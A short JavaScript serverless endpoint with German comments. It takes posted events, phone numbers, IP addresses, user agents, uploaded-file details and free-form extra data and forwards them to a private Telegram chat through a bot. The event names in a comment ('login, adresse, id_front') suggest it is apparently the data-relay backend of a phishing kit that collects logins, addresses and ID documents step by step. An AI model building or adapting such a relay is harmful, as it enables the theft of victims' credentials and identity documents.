export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "Method not allowed" });
  }

  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({ ok: false, error: "Missing env vars" });
    }

    const body = req.body || {};
    const event = String(body.event || "unknown"); // z.B. login, adresse, id_front...
    const ref = body.ref ? String(body.ref) : null;
    const lang = body.lang ? String(body.lang) : null;

    // Optional: IP / UA (nur wenn du willst)
    const ip =
      (req.headers["x-forwarded-for"] || "").toString().split(",")[0].trim() || null;
    const ua = req.headers["user-agent"] ? String(req.headers["user-agent"]) : null;

    // Helper: phone clean
    const rawPhone = body.phone ? String(body.phone) : "";
    const phone = rawPhone.replace(/\D/g, "");
    const phoneLine = phone ? `+${phone}` : "—";

    // Helper: file info (nur Meta, KEINE Bilder!)
    const fileName = body.fileName ? String(body.fileName) : null;
    const fileSize = Number.isFinite(body.fileSize) ? body.fileSize : null;

    // Nachricht je Event
    let text = `📩 Event: ${event}\n📞 Phone: ${phoneLine}`;

    if (ref) text += `\n🔗 Ref: ${ref}`;
    if (lang) text += `\n🌐 Lang: ${lang}`;
    if (fileName) text += `\n🖼️ File: ${fileName}${fileSize ? ` (${fileSize} bytes)` : ""}`;
    if (ip) text += `\n🌍 IP: ${ip}`;
    if (ua) text += `\n🧭 UA: ${ua}`;

    // Optional: Event-spezifische Texte
    const extra = body.extra && typeof body.extra === "object" ? body.extra : null;
    if (extra) {
      // Kurz und safe serialisieren
      const safeExtra = JSON.stringify(extra).slice(0, 800);
      text += `\n\nℹ️ Extra: ${safeExtra}`;
    }

    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });

    const data = await tgRes.json();
    if (!data.ok) {
      return res.status(500).json({ ok: false, error: "Telegram failed", details: data });
    }

    return res.status(200).json({ ok: true });
  } catch (e) {
    return res.status(500).json({ ok: false, error: "Server error" });
  }
}